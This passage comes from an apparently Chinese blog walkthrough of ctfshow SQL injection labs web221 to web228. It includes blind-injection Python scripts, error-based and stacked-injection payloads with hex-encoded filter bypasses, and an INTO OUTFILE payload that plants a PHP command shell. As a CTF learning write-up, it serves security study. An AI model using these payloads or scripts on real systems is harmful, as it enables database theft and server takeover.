src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250110134115117.png" alt="image-20250110134115117"></p><p>构造payload为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?page<span class="operator">=</span><span class="number">10</span><span class="operator">&amp;</span>limit<span class="operator">=</span><span class="number">10</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>);</span><br><span class="line">#解释:由于extractvalue()不是xml路径，而是字符串，因此会报错，报错信息中会带出数据库信息</span><br><span class="line">#<span class="keyword">procedure</span> analyse(xxx,<span class="number">1</span>)用于分析查询结果，本身并不会直接泄露信息，但它在这里的作用是确保extractvalue()被执行，并且引发错误。</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250110134228458.png" alt="image-20250110134228458"></p><p>获取库名为ctfshow_web_flag_x,即为flag</p><h2 id="web222-group-by无过滤注入"><a href="#web222-group-by无过滤注入" class="headerlink" title="web222(group by无过滤注入)"></a>web222(group by无过滤注入)</h2><p>可以使用布尔盲注或时间盲注，这里使用时间盲注</p><p>发现传参为page、limit、u通过web214的脚本更改使用</p><p>要注意的是，group by会向下一直查询，数据库里总共有21条数据，如果我们是sleep(1)则是停顿21秒</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要手动输入表名，列名，这里由于变为GET传参，请求体内不能使用data，要使用params，这样才能正确传递参数</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(0.05),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.get(url, params=&#123;<span class="string">&#x27;u&#x27;</span>: payload, <span class="string">&#x27;page&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;limit&#x27;</span>: <span class="number">10</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">1</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force1</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(0.05),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.get(url, params=&#123;<span class="string">&#x27;u&#x27;</span>: payload, <span class="string">&#x27;page&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;limit&#x27;</span>: <span class="number">10</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">1</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force2</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(0.05),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.get(url, params=&#123;<span class="string">&#x27;u&#x27;</span>: payload, <span class="string">&#x27;page&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;limit&#x27;</span>: <span class="number">10</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">1</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force3</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(<span class="subst">&#123;column&#125;</span>) from <span class="subst">&#123;table&#125;</span> ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(0.05),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.get(url, params=&#123;<span class="string">&#x27;u&#x27;</span>: payload, <span class="string">&#x27;page&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;limit&#x27;</span>: <span class="number">10</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">1</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 指定的URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://05826ba3-389a-4252-8590-74ae385b3602.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">    database=brute_force(url)</span><br><span class="line">    brute_force1(url)</span><br><span class="line">    table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">    brute_force2(url)</span><br><span class="line">    column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">    brute_force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250110153025385.png" alt="image-20250110153025385"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250110153700198.png" alt="image-20250110153700198"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250110153840123.png" alt="image-20250110153840123"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250110154542173.png" alt="image-20250110154542173"></p><h2 id="web223-group-by过滤数字注入"><a href="#web223-group-by过滤数字注入" class="headerlink" title="web223(group by过滤数字注入)"></a>web223(group by过滤数字注入)</h2><p>参考web185，下面脚本通过二分法寻找字符</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="type">time</span></span><br><span class="line">url <span class="operator">=</span> <span class="string">&#x27;http://8449d9bc-fc0c-4020-935a-03d55a6b5624.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line">str <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">def num2true(num):</span><br><span class="line">    str <span class="operator">=</span> <span class="string">&#x27;(&#x27;</span> <span class="operator">+</span> <span class="string">&#x27;true%2b&#x27;</span> <span class="operator">*</span> (num<span class="number">-1</span>) <span class="operator">+</span> <span class="string">&#x27;true)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">a <span class="operator">=</span> num2true(<span class="number">1</span>)</span><br><span class="line"># print(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    min,max <span class="operator">=</span> <span class="number">32</span>, <span class="number">128</span></span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        j <span class="operator">=</span> min <span class="operator">+</span> (max<span class="operator">-</span>min)<span class="operator">/</span><span class="operator">/</span><span class="number">2</span></span><br><span class="line">        if(min <span class="operator">=</span><span class="operator">=</span> j):</span><br><span class="line">            str <span class="operator">+</span><span class="operator">=</span> chr(j)</span><br><span class="line">            print(str)</span><br><span class="line">            break</span><br><span class="line">        # 爆表名</span><br><span class="line">        # payload <span class="operator">=</span> f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;</span><br><span class="line">        # 爆列</span><br><span class="line">        # payload <span class="operator">=</span> f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;</span><br><span class="line">        # 爆值</span><br><span class="line">        payload <span class="operator">=</span> f&quot;if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;</span><br><span class="line">        r <span class="operator">=</span> requests.get(url<span class="operator">=</span>url<span class="operator">+</span>payload).text</span><br><span class="line">        # print(r)</span><br><span class="line">        if <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            max <span class="operator">=</span> j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            min <span class="operator">=</span> j</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250110162820211.png" alt="image-20250110162820211"></p><h2 id="web224-文件上传注入"><a href="#web224-文件上传注入" class="headerlink" title="web224(文件上传注入)"></a>web224(文件上传注入)</h2><p>扫目录发现&#x2F;robots.txt</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111154023631.png" alt="image-20250111154023631"></p><p>访问发现更改密码界面，更改admin密码为1成功登录，出现以下页面为文件上传</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111153645888.png" alt="image-20250111153645888"></p><p>做到这里想直接上传图片马但是失败了,去看了wp是要读取文件内容来判断文件类型的原因，在txt文件中写入以下payload，C64File 是与 Commodore 64 相关的文件类型，之后闭合，写入 sql 语句(注意，写入文件时若写在1.php下会报错)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">C64File <span class="string">&quot;&#x27;);select 0x3c3f3d60746163202f662a603f3e into outfile &#x27;/var/www/html/2.php&#x27;;--+</span></span><br><span class="line"><span class="string">#0x3c3f3d60746163202f662a603f3e为&lt;?=`tac /f*`?&gt;的十六进制形式</span></span><br></pre></td></tr></table></figure><p>访问写入的2.php获得flag</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111155544918.png" alt="image-20250111155544918"></p><h2 id="web225-堆叠注入过滤select"><a href="#web225-堆叠注入过滤select" class="headerlink" title="web225(堆叠注入过滤select)"></a>web225(堆叠注入过滤select)</h2><p>过滤了一堆东西，查询时发现通过向&#x2F;apiGET传参查询</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111162934369.png" alt="image-20250111162934369"></p><p>通过向username堆叠注入获取库表列flag</p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111163320739.png" alt="image-20250111163320739"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111163805557.png" alt="image-20250111163805557"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;show columns from ctfshow_flagasa;</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111164202346.png" alt="image-20250111164202346"></p><h3 id="补充-handler语句"><a href="#补充-handler语句" class="headerlink" title="补充:handler语句"></a>补充:handler语句</h3><p>handler 是 mysql 的专用语句，没有包含到 SQL 标准中，但它每次只能查询 1 次记录，而 select 可以根据需要返回多条查询结果。 </p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hander `表名` <span class="keyword">open</span>;           <span class="operator">/</span><span class="operator">/</span> 打开一个表</span><br><span class="line"></span><br><span class="line">handler`表名`read <span class="keyword">first</span>;      <span class="operator">/</span><span class="operator">/</span> 查询第一个数据</span><br><span class="line"></span><br><span class="line">handler`表名`read next;     <span class="operator">/</span><span class="operator">/</span> 查询之后的数据直到最后一个数据返回空</span><br></pre></td></tr></table></figure><p>爆flag</p><p>注意，这里由于过滤了select，因此要使用handler语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;handler`ctfshow_flagasa`open;handler`ctfshow_flagasa`read next;#</span></span><br><span class="line"><span class="string">username=0&#x27;</span>;<span class="keyword">select</span> flagas <span class="keyword">from</span> ctfshow_flagasa;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111165602799.png" alt="image-20250111165602799"></p><hr><p>也可以通过预处理命令来实现</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;prepare myon from concat(&quot;sel&quot;,&quot;ect * from `ctfshow_flagasa`&quot;);execute myon;#</span></span><br></pre></td></tr></table></figure><ul><li><p>prepare myon from concat(“sel”,”ect * from ctfshow_flagasa”)</p><p>PREPARE 是SQL中的一个命令，用于准备一个SQL语句以便稍后执行。myon 是为这个准备好的语句指定的名称。CONCAT(“sel”,”ect * from ctfshow_flagasa”) 将两个字符串拼接成一个完整的SQL查询，即 “select * from ctfshow_flagasa”。</p></li><li><p>execute myon:</p><p>EXECUTE 命令用于执行之前通过 PREPARE 准备好的SQL语句。在这个例子中，它会执行 SELECT * FROM ctfshow_flagasa。</p></li></ul><h2 id="web226-堆叠注入-show和"><a href="#web226-堆叠注入-show和" class="headerlink" title="web226(堆叠注入+show和())"></a>web226(堆叠注入+show和())</h2><p>通过上题提到的预处理和十六进制编码实现堆叠注入</p><blockquote><p>注意，MySQL 允许用户以十六进制字符串的形式输入二进制数据。十六进制字符串以 <code>0x</code> 开头，后面跟一系列的十六进制字符（0-9, A-F）。例如：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x4D7953514C</span>;</span><br></pre></td></tr></table></figure><p>这条语句会将十六进制字符串 <code>0x4D7953514C</code> 解释为二进制数据，并将其转换为对应的 ASCII 字符串 <code>&quot;MySQL&quot;</code>。</p></blockquote><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from show databases;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f7720646174616261736573</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111173601241.png" alt="image-20250111173601241"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from show tables;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f77207461626c6573</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111173816049.png" alt="image-20250111173816049"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from show columns from ctfsh_ow_flagas;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f7720636f6c756d6e732066726f6d2063746673685f6f775f666c61676173</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111174136732.png" alt="image-20250111174136732"></p><p>爆flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from select flagasb from ctfsh_ow_flagas;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111174806622.png" alt="image-20250111174806622"></p><h2 id="web227-堆叠注入-db"><a href="#web227-堆叠注入-db" class="headerlink" title="web227(堆叠注入+db)"></a>web227(堆叠注入+db)</h2><p>同上题，相同方式可绕过过滤</p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from show databases;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f7720646174616261736573</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111175530715.png" alt="image-20250111175530715"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from show tables;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f77207461626c6573</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111175614232.png" alt="image-20250111175614232"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from show columns from ctfshow_user;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f7720636f6c756d6e732066726f6d2063746673686f775f75736572</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111175736109.png" alt="image-20250111175736109"></p><p>爆flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from select pass from ctfshow_user;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73656c65637420706173732066726f6d2063746673686f775f75736572</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111180052862.png" alt="image-20250111180052862"></p><p>但是没有flag，看wp后知道这道题需要查看存储过程和函数的状态，通过查询 information_schema.ROUTINES 表来查看存储过程和函数的详细信息，直接查这个表下的所有东西</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from select * from information_schema.routines;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111180555813.png" alt="image-20250111180555813"></p><p>此时已经找到flag，也可以通过具体指定函数名再进行详细查找，由上图发现函数名为getFlag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from select * from information_schema.routines where routine_name=&#x27;</span>getFlag<span class="string">&#x27;;execute test;#</span></span><br><span class="line"><span class="string">#其中 routine_name 用于指定存储过程或函数的名称</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e657320776865726520726f7574696e655f6e616d653d27676574466c616727</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111181033885.png" alt="image-20250111181033885"></p><p>如果存储过程和存储函数名称相同，则需要再指定  routine_type  字段表明查询的是哪种类型的存储程序：</p><p>比如指定查询的类型是函数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from select * from information_schema.routines where routine_name=&#x27;</span>getFlag<span class="string">&#x27; and routine_type=&#x27;</span><span class="keyword">function</span><span class="string">&#x27;;execute test;#</span></span><br><span class="line"><span class="string">https://a678d0b6-d290-4094-87e4-ad969fed44ad.challenge.ctf.show/api/?username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x2073656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e657320776865726520726f7574696e655f6e616d653d27676574466c61672720616e6420726f7574696e655f747970653d2766756e6374696f6e27</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111181332389.png" alt="image-20250111181332389"></p><p>没有结果，尝试指定类型为进程</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;prepare test from select * from information_schema.routines where routine_name=&#x27;</span>getFlag<span class="string">&#x27; and routine_type=&#x27;</span><span class="keyword">procedure</span><span class="string">&#x27;;execute test;#</span></span><br><span class="line"><span class="string">username=1&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e657320776865726520726f7574696e655f6e616d653d27676574466c61672720616e6420726f7574696e655f747970653d2770726f63656475726527</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250111181507372.png" alt="image-20250111181507372"></p><p>最终发现getFlag为一个进程</p><p>可参考<a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a></p><h2 id="web228-堆叠注入-黑盒过滤"><a href="#web228-堆叠注入-黑盒过滤" class="headerlink" title="web228(堆叠注入+黑盒过滤)"></a>web228(堆叠注入+黑盒过滤)</h2><p>还是使用预编译试试、</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;prepare test from show tables;execute test;#</span></span><br><span class="line"><span class="string">username=0&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f77207461626c6573</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112134545819.png" alt="image-20250112134545819"></p><p>可以实现，按照列名flag顺序进行</p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;prepare test from show columns from ctfsh_ow_flagasaa;execute test;#</span></span><br><span class="line"><span class="string">username=0&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f7720636f6c756d6e732066726f6d2063746673685f6f775f666c616761736161</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img 